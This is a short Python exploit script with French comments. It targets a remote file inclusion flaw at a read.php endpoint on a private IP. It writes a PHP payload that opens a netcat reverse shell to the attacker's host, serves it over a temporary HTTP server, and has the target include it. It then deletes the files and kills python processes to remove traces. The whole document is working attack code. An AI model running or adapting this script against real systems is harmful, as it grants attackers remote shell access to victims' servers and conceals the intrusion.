#encoding:utf-8
import requests,sys,os,time
# Exploitation de la faille RFI
#nc -lvp 12345 sur l'hôte distant
if len(sys.argv)!=3:
	print "Usage : python exploit_rfi.py <local IP> <local Port>"
	exit(1)

# préparer un shell dans /tmp/ws/exploit.txt et démarrer une serveur http écoute sur le port 8000 (port par défaut)
os.system("mkdir /tmp/ws; echo \"<?php system('nc "+sys.argv[1]+" "+sys.argv[2]+" -e /bin/sh'); ?>\" > /tmp/ws/exploit.txt ; cd /tmp/ws; python -m SimpleHTTPServer &")
time.sleep(2)
# Exploit la faille remote file inclusion et invoquer le shell préparé 
requests.get("http://192.168.4.1/read.php",params={"file":"http://"+sys.argv[1]+":8000/exploit.txt"})
time.sleep(2)
# Shutdown le server http et nettoyer les traces
os.system("rm -R /tmp/ws;pkill python")
